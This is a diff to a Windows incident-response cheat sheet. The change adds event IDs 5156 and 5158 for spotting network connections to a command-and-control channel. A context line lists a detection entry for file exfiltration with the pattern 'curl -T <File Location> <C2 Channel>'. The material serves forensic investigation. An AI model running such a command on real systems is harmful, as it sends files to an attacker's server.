@@ -211,7 +211,7 @@ By default, Windows Event Logs are stored at '`C:\Windows\system32\winevt\logs`
 |:---:|:---:|:---:|
 |Identify physical cards|`SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards`|Registry Explorer/RegRipper|
 |Identify interface configuration (IP address, DHCP Server, DHCP Name Server)|`SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces`|Registry Explorer/RegRipper|
-|Connections History (Interfaces lastWrite, lastConnected, dateCreated, DefaultGatewayMac, Type) |`SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged` `SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles` `Microsoft-Windows-WLAN-AutoConfig%4Operational.evtx`<br>`Microsoft-Windows-Sysmon%4Operational.evtx` (Useful to find C2 channel IP address, 3 -> Network connection detected)|WifiHistoryView/Registry Explorer/Event Log Explorer|
+|Connections History (Interfaces lastWrite, lastConnected, dateCreated, DefaultGatewayMac, Type) |`SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged` `SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles` `Microsoft-Windows-WLAN-AutoConfig%4Operational.evtx`<br>`Microsoft-Windows-Sysmon%4Operational.evtx` (Useful to find C2 channel IP address, 3 OR 5156 OR 5158 -> Network connection detected)|WifiHistoryView/Registry Explorer/Event Log Explorer|
 |curl command, exfiltration through curl put command|2 -> `curl -T <File Location> <C2 Channel>`|Event Log Explorer|
 
 #### Users Information
